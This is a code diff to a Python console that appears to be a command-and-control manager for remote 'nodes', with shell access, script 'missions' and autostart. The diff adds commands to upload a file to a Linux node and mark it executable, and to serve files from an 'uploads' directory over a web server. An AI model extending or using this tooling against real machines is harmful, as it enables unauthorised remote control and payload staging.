@@ -1,12 +1,15 @@
 # TODO: Add file upload
-
+# NOTE: Idea for goggle bots you can deploy on machines. These can aid in operations with file upload and download. 
+#       Can create using python, bash, powershell, etc...
+import base64
 from cmd import Cmd
 from datetime import datetime
 import random
 from src.c_node import *
 from src.c_color import *
+from src.c_uploader import *
 import threading
-from os import system, listdir, path
+from os import system, listdir, path, chdir, getcwd
 from pprint import pprint
 from sys import platform
 
@@ -30,6 +33,9 @@ class Manager(Cmd):
     status <node>           - Get the status of a specific node (DEAD, LISTENING, CONNECTED)
     info <node>             - Get basic information of a given node connection. (Hostname, current user, os version)
     shell <node>            - Drop into a shell on the given node and run commands manually.
+
+    upload <node> <local_file> <new_filename>   - Uploads a file from the 'uploads' directory and makes it executable. 
+    host                    - Host webserver in 'uploads' directory for file downloads. 
 
     scripts                 - List all available scripts in 'missions/windows' and 'missions/linux'
     assign <node> <script>  - Assign a given script to a given node. Script should be in the form of 'linux/my_script' or 'windows/my_script'
@@ -105,7 +111,7 @@ class Manager(Cmd):
             print("Ope: Invalid Syntax!")
             return -1
         node = self.get_node(arg)
-        if not isinstance(node, CNode) and not isinstance(node, LNode):
+        if not isinstance(node, (LNode, CNode)):
             print("Ope: Invalid node, cannot switch to shell...")
             return -1
         print(f"Dropping into shell on '{node.name}'.")
@@ -156,7 +162,7 @@ class Manager(Cmd):
             print("Ope: Invalid Syntax!")
             return -1
         node = self.get_node(name)
-        if not isinstance(node, CNode) and not isinstance(node, LNode):
+        if not isinstance(node, (CNode, LNode)):
             print("Ope: Invalid node!")
             return -1
         
@@ -175,7 +181,7 @@ class Manager(Cmd):
             print("Ope: Invalid Syntax!")
             return -1
         node = self.get_node(name)
-        if not isinstance(node, CNode) and not isinstance(node, LNode):
+        if not isinstance(node, (CNode, LNode)):
             print("Ope: Invalid node!")
             return -1
         node.close()
@@ -185,7 +191,7 @@ class Manager(Cmd):
             print("Ope: Invalid Syntax!")
             return -1
         node = self.get_node(name)
-        if not isinstance(node, CNode) and not isinstance(node, LNode):
+        if not isinstance(node, (CNode, LNode)):
             print("Ope: Invalid node!")
 
         try:
@@ -271,6 +277,39 @@ class Manager(Cmd):
         t = threading.Thread(target=self._autostart, args=(args,), daemon=True)
         self.threads.append(t)
         t.start()
+
+    def do_upload(self, args):
+        # TODO: Implement multiple ways to upload files
+        # NOTE: ONLY WORKS FOR LINUX
+        try:
+            node, filename, new_filename = args.split()
+        except ValueError:
+            print("Ope: Syntax error!\nupload <node> <file> <new_name>")
+            return
+        
+        node = self.get_node(node)
+        if not isinstance(node, (CNode, LNode)):
+            return
+        
+        try:
+            cmd = Uploader.linux_script_upload(filename, new_filename)
+            node.run_cmd(cmd)
+        except UploadFileNotFound:
+            print("Ope: Couldn't find that upload file!")
+            return
+
+        print("File upload successfull!")
+
+    def do_host(self, args):
+        if args:
+            chdir(args)
+        else:
+            chdir("uploads")
+
+        t = threading.Thread(target=Uploader.web_host_upload, daemon=True)
+        t.start()
+        self.threads.append(t)
+        chdir("..")
 
     def get_node(self, name):
         try:
